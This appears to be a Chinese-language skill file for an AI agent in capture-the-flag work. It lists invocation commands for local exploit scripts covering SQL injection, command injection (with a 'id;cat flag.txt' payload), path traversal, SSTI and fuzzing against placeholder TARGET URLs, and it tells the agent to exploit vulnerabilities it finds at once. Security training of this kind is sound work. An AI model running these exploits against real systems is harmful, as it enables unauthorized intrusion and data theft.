---
name: payload 脚本库速查
description: 当发现 SQLi、命令注入、目录穿越/LFI、SSTI 等漏洞点时，直接调用 arsenal/payloads/ 下的可执行脚本进行利用，而不是让 LLM 手写临时脚本。
triggers: payload, exploit, 利用, sqli, cmdi, lfi, ssti, 目录穿越, 命令注入, 模板注入
---

## 原则

发现漏洞点后，**不要**在 shell 里临时拼凑 payload。**优先调用现成的可执行脚本**，它们统一接口、输出结构化、自动提取 flag 候选。

脚本位置：`/home/kali/SECAI/arsenal/payloads/`

## 常用入口

### SQL 注入
```bash
python3 arsenal/payloads/sqli_union.py \
  --url 'http://TARGET/page.php?id=1' --param id \
  --db mysql --method GET
```

### 命令注入
```bash
python3 arsenal/payloads/cmdi_exec.py \
  --url 'http://TARGET/ping.php?ip=127.0.0.1' --param ip \
  --cmd 'id;cat flag.txt' --method GET
```

### 目录穿越 / LFI
```bash
python3 arsenal/payloads/path_traversal.py \
  --url 'http://TARGET/download.php?file=' --param file \
  --method GET
```

### SSTI
```bash
python3 arsenal/payloads/ssti_probe.py \
  --url 'http://TARGET/greet?name=' --param name \
  --method GET
```

### 通用 fuzz
```bash
python3 arsenal/payloads/exploit_fuzz.py \
  --url 'http://TARGET/search.php' --param q --method POST --data 'q=x' \
  --template "{P}" --variants "1,1',1\"" --success-regex "flag|root"
```

## 使用纪律

1. 探测到注入点 / 可疑参数后，立即用对应脚本验证，不要手动多次试探。
2. 脚本输出 `[success]` 或 `[HIT]` 时，把具体输出内容作为证据写入黑板。
3. 如果脚本未命中，记录失败原因（基线长度、响应状态），避免同一参数重复测试。
4. 拿到 flag 后，立即调用 `finalize` 提交，不要继续执行其他命令。
